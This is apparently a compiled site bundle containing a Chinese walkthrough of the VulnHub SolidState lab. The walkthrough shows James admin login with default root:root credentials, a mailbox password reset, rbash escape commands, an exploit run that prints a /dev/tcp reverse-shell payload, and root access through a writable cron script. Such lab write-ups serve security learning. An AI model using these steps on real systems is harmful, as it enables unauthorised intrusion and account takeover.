"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[2559],{6333:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>p,frontMatter:()=>a,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"VulnHub/Virtual Machines/SolidState","title":"SolidState","description":"port scan","source":"@site/docs/VulnHub/Virtual Machines/SolidState.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/SolidState","permalink":"/docs/VulnHub/Virtual Machines/SolidState","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/SolidState.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"SkyTower","permalink":"/docs/VulnHub/Virtual Machines/SkyTower"},"next":{"title":"Temple_of_Doom","permalink":"/docs/VulnHub/Virtual Machines/Temple_of_Doom"}}');var o=r(4848),t=r(8453);const a={},i=void 0,l={},c=[{value:"port scan",id:"port-scan",level:2},{value:"James Server",id:"james-server",level:2},{value:"POP3",id:"pop3",level:2},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:2}];function d(e){const n={a:"a",code:"code",h2:"h2",img:"img",p:"p",pre:"pre",strong:"strong",...(0,t.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.h2,{id:"port-scan",children:"port scan"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Wed Jan 22 04:48:21 2025 as: nmap -sT --min-rate 10000 -p- -oN nmap_result/port 192.168.28.13\r\nNmap scan report for 192.168.28.13 (192.168.28.13)\r\nHost is up (0.0025s latency).\r\nNot shown: 65529 closed tcp ports (conn-refused)\r\nPORT     STATE SERVICE\r\n22/tcp   open  ssh\r\n25/tcp   open  smtp\r\n80/tcp   open  http\r\n110/tcp  open  pop3\r\n119/tcp  open  nntp\r\n4555/tcp open  rsip\n"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Wed Jan 22 04:49:08 2025 as: nmap -sT -sVC -O -p22,25,80,110,119,4555 -oN nmap_result/detils 192.168.28.13\r\nNmap scan report for 192.168.28.13 (192.168.28.13)\r\nHost is up (0.00080s latency).\r\n\r\nPORT     STATE SERVICE     VERSION\r\n22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)\r\n| ssh-hostkey: \r\n|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)\r\n|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)\r\n|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)\r\n25/tcp   open  smtp        JAMES smtpd 2.3.2\r\n|_smtp-commands: solidstate Hello 192.168.28.13 (192.168.28.4 [192.168.28.4]), PIPELINING, ENHANCEDSTATUSCODES\r\n80/tcp   open  http        Apache httpd 2.4.25 ((Debian))\r\n|_http-server-header: Apache/2.4.25 (Debian)\r\n|_http-title: Home - Solid State Security\r\n110/tcp  open  pop3        JAMES pop3d 2.3.2\r\n119/tcp  open  nntp        JAMES nntpd (posting ok)\r\n4555/tcp open  james-admin JAMES Remote Admin 2.3.2\r\nMAC Address: 00:0C:29:2A:4B:40 (VMware)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nDevice type: general purpose\r\nRunning: Linux 3.X|4.X\r\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\r\nOS details: Linux 3.2 - 4.9\r\nNetwork Distance: 1 hop\r\nService Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,o.jsxs)(n.p,{children:["110\u7aef\u53e3\uff1a",(0,o.jsx)(n.strong,{children:"\u90ae\u5c40\u534f\u8bae (POP)"})," \u88ab\u63cf\u8ff0\u4e3a\u8ba1\u7b97\u673a\u7f51\u7edc\u548c\u4e92\u8054\u7f51\u9886\u57df\u4e2d\u7684\u4e00\u79cd\u534f\u8bae\uff0c\u7528\u4e8e\u4ece\u8fdc\u7a0b\u90ae\u4ef6\u670d\u52a1\u5668\u4e2d\u63d0\u53d6\u548c",(0,o.jsx)(n.strong,{children:"\u68c0\u7d22\u7535\u5b50\u90ae\u4ef6"})]}),"\n",(0,o.jsx)(n.p,{children:"4555\u7aef\u53e3\uff1ajames\u8fdc\u7a0b\u7ba1\u7406\u5de5\u5177"}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250122192430900.png",alt:"image-20250122192430900"})}),"\n",(0,o.jsxs)(n.p,{children:[(0,o.jsx)(n.code,{children:"50347.py"}),"\u811a\u672c\u4e2d\uff0c\u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801",(0,o.jsx)(n.code,{children:"root:root"})]}),"\n",(0,o.jsx)(n.h2,{id:"james-server",children:"James Server"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/vulnhub/SolidState]\r\n\u2514\u2500$ nc 192.168.28.13 4555  \r\nJAMES Remote Administration Tool 2.3.2\r\nPlease enter your login and password\r\nLogin id:\r\nroot\r\nPassword:\r\nroot\r\nWelcome root. HELP for a list of commands\r\nhelp\r\nCurrently implemented commands:\r\nhelp                                    display this help\r\nlistusers                               display existing accounts\r\ncountusers                              display the number of existing accounts\r\nadduser [username] [password]           add a new user\r\nverify [username]                       verify if specified user exist\r\ndeluser [username]                      delete existing user\r\nsetpassword [username] [password]       sets a user's password\r\nsetalias [user] [alias]                 locally forwards all email for 'user' to 'alias'\r\nshowalias [username]                    shows a user's current email alias\r\nunsetalias [user]                       unsets an alias for 'user'\r\nsetforwarding [username] [emailaddress] forwards a user's email to another email address\r\nshowforwarding [username]               shows a user's current email forwarding\r\nunsetforwarding [username]              removes a forward\r\nuser [repositoryname]                   change to another user repository\r\nshutdown                                kills the current JVM (convenient when James is run as a daemon)\r\nquit                                    close connection\r\nlistusers\r\nExisting accounts 6\r\nuser: james\r\nuser: ../../../../../../../../etc/bash_completion.d\r\nuser: thomas\r\nuser: john\r\nuser: mindy\r\nuser: mailadmin\r\nsetpassword mindy 123456\r\nPassword for mindy reset\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u7528\u6237\u67096\u4e2a"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{children:"Existing accounts 6\r\nuser: james\r\nuser: ../../../../../../../../etc/bash_completion.d\r\nuser: thomas\r\nuser: john\r\nuser: mindy\r\nuser: mailadmin\n"})}),"\n",(0,o.jsxs)(n.p,{children:["\u5c06",(0,o.jsx)(n.code,{children:"mindy"}),"\u5bc6\u7801\u8bbe\u7f6e\u4e3a123456"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{children:"setpassword mindy 123456\r\nPassword for mindy rese\n"})}),"\n",(0,o.jsx)(n.h2,{id:"pop3",children:"POP3"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/vulnhub/SolidState]\r\n\u2514\u2500$ telnet 192.168.28.14 110\r\nTrying 192.168.28.14...\r\nConnected to 192.168.28.14.\r\nEscape character is '^]'.\r\n+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready \r\nUSER mindy\r\n+OK\r\nPASS 123456\r\n+OK Welcome mindy\r\nlist\r\n+OK 2 1945\r\n1 1109\r\n2 836\r\n.\r\nretr 1\r\n+OK Message follows\r\nReturn-Path: <mailadmin@localhost>\r\nMessage-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset=us-ascii\r\nContent-Transfer-Encoding: 7bit\r\nDelivered-To: mindy@localhost\r\nReceived: from 192.168.11.142 ([192.168.11.142])\r\n          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798\r\n          for <mindy@localhost>;\r\n          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)\r\nDate: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)\r\nFrom: mailadmin@localhost\r\nSubject: Welcome\r\n\r\nDear Mindy,\r\nWelcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.\r\n\r\nWe are looking forward to you joining our team and your success at Solid State Security. \r\n\r\nRespectfully,\r\nJames\r\n.\r\nretr 2\r\n+OK Message follows\r\nReturn-Path: <mailadmin@localhost>\r\nMessage-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset=us-ascii\r\nContent-Transfer-Encoding: 7bit\r\nDelivered-To: mindy@localhost\r\nReceived: from 192.168.11.142 ([192.168.11.142])\r\n          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581\r\n          for <mindy@localhost>;\r\n          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)\r\nDate: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)\r\nFrom: mailadmin@localhost\r\nSubject: Your Access\r\n\r\nDear Mindy,\r\n\r\n\r\nHere are your ssh credentials to access the system. Remember to reset your password after your first login. \r\nYour access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. \r\n\r\nusername: mindy\r\npass: P@55W0rd1!2@\r\n\r\nRespectfully,\r\nJames\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u767b\u5f55\u7528\u6237mindy\uff0cretr\u547d\u4ee4\uff0c\u67e5\u770b\u90ae\u4ef6"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{children:"username: mindy\r\npass: P@55W0rd1!2@\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u7ed5\u8fc7rbash\u9650\u5236"}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.a,{href:"https://xz.aliyun.com/t/7642",children:"https://xz.aliyun.com/t/7642"})}),"\n",(0,o.jsx)(n.p,{children:"ssh\u767b\u5f55\u65f6\u9003\u9038 \uff08\u501f\u52a9-t\u8fdc\u7a0b\u5728\u8fdc\u7a0b\u673a\u5668\u4e0a\u8fd0\u884c\u811a\u672c\uff09"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{children:'ssh mindy@192.168.28.14 "python -c \'import os; os.system(\\"/bin/bash\\")\'"\n'})}),"\n",(0,o.jsx)(n.p,{children:"\u6216"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{children:'ssh mindy@192.168.28.14 -t "bash --noprofile"\n'})}),"\n",(0,o.jsxs)(n.p,{children:["\u4e5f\u53ef\u4ee5\u901a\u8fc7",(0,o.jsx)(n.code,{children:"50347.py"}),"\uff08james-admin\uff09\u7684RCE\u6f0f\u6d1e\uff0c\u7ed5\u8fc7rbash"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/vulnhub/SolidState]\r\n\u2514\u2500$ python3 50347.py 192.168.28.14 192.168.28.4 1234\r\n[+]Payload Selected (see script for more options):  /bin/bash -i >& /dev/tcp/192.168.28.4/1234 0>&1\r\n[+]Example netcat listener syntax to use after successful execution: nc -lvnp 1234\r\n[+]Connecting to James Remote Administration Tool...\r\n[+]Creating user...\r\n[+]Connecting to James SMTP server...\r\n[+]Sending payload...\r\n[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).\r\n[+]Don't forget to start a listener on port 1234 before logging in!\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u767b\u5f55ssh\uff0c\u89e6\u53d1payload"}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250123130015559.png",alt:"image-20250123130015559"})}),"\n",(0,o.jsx)(n.h2,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,o.jsx)(n.p,{children:"\u67e5\u627e\u53ef\u5199\u6587\u4ef6"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{children:"find / -writable 2>/dev/null \n"})}),"\n",(0,o.jsx)(n.p,{children:"/opt/tmp.py"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-shell",children:"mindy@solidstate:/opt$ ls -la\r\ntotal 16\r\ndrwxr-xr-x  3 root root 4096 Aug 22  2017 .\r\ndrwxr-xr-x 22 root root 4096 Jun 18  2017 ..\r\ndrwxr-xr-x 11 root root 4096 Aug 22  2017 james-2.3.2\r\n-rwxrwxrwx  1 root root  147 Jan 22 05:48 tmp.py\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u731c\u6d4b\u662f\u5b9a\u65f6\u4efb\u52a1\uff0c\u63d2\u5165python\u4ee3\u7801"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-shell",children:"mindy@solidstate:/opt$ cat tmp.py\r\n#!/usr/bin/env python\r\nimport os\r\nimport sys\r\ntry:\r\n     os.system('rm -r /tmp/* ;cp /bin/bash /tmp/bash;chmod +s /tmp/bash')\r\nexcept:\r\n     sys.exit()\n"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-shell",children:"mindy@solidstate:/tmp$ ./bash -p\r\nbash-4.4# id\r\nuid=1001(mindy) gid=1001(mindy) euid=0(root) egid=0(root) groups=0(root),1001(mindy)\r\nbash-4.4# whoami\r\nroot\r\nbash-4.4# cd /root\r\nbash-4.4# ls\r\nroot.txt\r\nbash-4.4# cat root.txt\r\nb4c9723a28899b1c45db281d99cc87c9\n"})}),"\n",(0,o.jsxs)(n.p,{children:[(0,o.jsx)(n.code,{children:"/var/spool/cron/crontabs/root"}),"\u679c\u7136\u5b58\u5728\u5b9a\u65f6\u4efb\u52a1"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-shell",children:"bash-4.4# cat /var/spool/cron/crontabs/root\r\n......\r\n*/3 * * * * python /opt/tmp.py\n"})})]})}function p(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(d,{...e})}):d(e)}},8453:(e,n,r)=>{r.d(n,{R:()=>a,x:()=>i});var s=r(6540);const o={},t=s.createContext(o);function a(e){const n=s.useContext(t);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:a(e.components),s.createElement(t.Provider,{value:n},e.children)}}}]);